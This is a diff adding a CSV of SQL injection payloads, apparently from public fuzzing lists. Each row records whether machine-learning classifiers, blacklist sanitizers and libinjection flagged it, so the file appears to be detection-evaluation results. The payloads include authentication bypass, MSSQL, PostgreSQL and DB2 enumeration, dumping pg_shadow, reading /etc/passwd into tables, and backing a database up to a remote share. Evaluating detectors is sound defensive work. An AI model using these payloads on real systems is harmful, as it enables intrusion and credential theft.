@@ -1,0 +1,49 @@
+file,Query,pred::LR baza,pred::SVM baza,pred::RF baza,pred::NB baza,pred::LR + normallaşdırma,pred::LR + norm. + augmentation,pred::Qara siyahı (sanitizeInput),pred::Qara siyahı (sanitizeSearch),pred::libinjection 4.0.1
+SQL Injection/Intruder/Auth_Bypass2.txt,' group by userid having 1=1--,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,select @@servernamee,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,select @@microsoftversione,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,select * from master..sysserverse,0,0,0,1,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,select * from sysusers,0,0,0,1,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,BACKUP database master to disks='\\10.10.1.2\10.10.1.2\backupdb.dat',0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_MSSQL_Enumeration.txt,"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_MySQL_ReadLocalFiles.txt,create table myfile (input TEXT); load data infile '/etc/passwd' into table myfile; select * from myfile;,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_database();,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_user;,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select session_user;,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('log_connections');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('log_statement');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('port');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('password_encryption');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('krb_server_keyfile');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('virtual_host');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('config_file');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('hba_file');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select current_setting('data_directory');,0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select * from pg_shadow;,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select * from pg_group;,0,0,0,1,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,create table myfile (input TEXT);,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,copy myfile from '/etc/passwd';,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/FUZZDB_Postgres_Enumeration.txt,select * from myfile;copy myfile to /tmp/test;,0,0,0,0,0,0,1,1,0
+SQL Injection/Intruder/Generic_ErrorBased.txt,HAVING 1=1,0,0,0,1,0,0,0,0,0
+SQL Injection/Intruder/Generic_ErrorBased.txt,HAVING 1=0,0,0,0,1,0,0,0,0,0
+SQL Injection/Intruder/Generic_ErrorBased.txt,HAVING 1=1#,0,0,0,1,0,0,0,0,0
+SQL Injection/Intruder/Generic_ErrorBased.txt,HAVING 1=0#,0,0,0,1,0,0,0,0,0
+SQL Injection/Intruder/Generic_ErrorBased.txt,ORDER BY 31337,0,0,1,0,0,0,1,0,0
+SQL Injection/Intruder/Generic_Fuzz.txt,1/*'*/,1,1,1,1,0,0,1,1,1
+SQL Injection/Intruder/SQL-Injection,'LIKE',0,0,0,0,0,0,1,1,1
+SQL Injection/Intruder/SQL-Injection,AND false,0,0,0,0,0,0,1,0,0
+SQL Injection/Intruder/SQL-Injection,1-false,0,0,0,0,0,0,0,0,0
+SQL Injection/Intruder/SQL-Injection,1 AND (SELECT * FROM Users) = 1,1,1,0,1,1,0,1,1,1
+attack/sql-injection/detect/MySQL.txt,fake@ema'or'il.nl'='il.nl,0,0,0,0,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,"select versionnumber, version_timestamp from sysibm.sysversions;",0,0,0,0,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,select user from sysibm.sysdummy1;,0,0,0,1,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,select session_user from sysibm.sysdummy1;,0,0,0,1,0,0,1,1,0
+attack/sql-injection/exploit/db2-enumeration.txt,select system_user from sysibm.sysdummy1;,0,0,0,1,0,0,1,1,0
+attack/sql-injection/exploit/db2-enumeration.txt,select current server from sysibm.sysdummy1;,0,0,0,0,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,select name from sysibm.systables;,0,0,0,1,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,select grantee from syscat.dbauth;,0,0,0,0,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,select * from syscat.tabauth;,0,0,0,0,0,0,1,1,0
+attack/sql-injection/exploit/db2-enumeration.txt,select * from syscat.dbauth where grantee = current user;,0,0,0,0,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,select * from syscat.tabauth where grantee = current user;,0,0,0,0,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,"select name, tbname, coltype from sysibm.syscolumns;",0,0,0,1,0,0,1,1,1
+attack/sql-injection/exploit/db2-enumeration.txt,SELECT schemaname FROM syscat.schemata;,0,0,0,0,0,0,1,1,1
